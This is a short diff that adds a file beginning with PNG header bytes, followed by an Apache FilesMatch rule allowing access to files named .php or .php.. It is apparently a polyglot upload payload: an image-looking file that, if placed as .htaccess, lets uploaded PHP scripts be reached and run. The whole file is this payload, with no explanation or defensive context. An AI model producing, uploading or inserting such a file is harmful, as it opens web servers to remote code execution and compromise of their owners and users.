@@ -1,0 +1,10 @@
+\89PNG
+
+\00\00
+IHDRf
+
+<FilesMatch "\.(php|php\.)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
